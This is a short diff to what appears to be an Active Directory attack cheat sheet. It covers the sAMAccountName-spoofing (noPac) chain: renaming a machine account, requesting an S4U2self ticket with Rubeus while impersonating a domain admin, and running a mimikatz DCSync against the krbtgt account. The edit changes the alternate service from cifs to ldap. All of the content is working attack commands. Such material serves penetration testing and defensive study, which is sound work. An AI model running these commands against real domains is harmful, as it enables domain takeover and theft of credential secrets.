@@ -106,7 +106,7 @@ Rubeus.exe asktgt /user:"DomainController" /password:"ComputerPassword" /domain:
 Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "ControlledComputer" -Attribute samaccountname -Verbose
 
 # 5. obtain a service ticket with S4U2self by presenting the previous TGT
-Rubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"cifs/DomainController.domain.local" /dc:"DomainController.domain.local" /ptt /ticket:[Base64 TGT]
+Rubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"ldap/DomainController.domain.local" /dc:"DomainController.domain.local" /ptt /ticket:[Base64 TGT]
 
 # 6. DCSync
 (mimikatz) lsadump::dcsync /domain:domain.local /kdc:DomainController.domain.local /user:krbtgt 
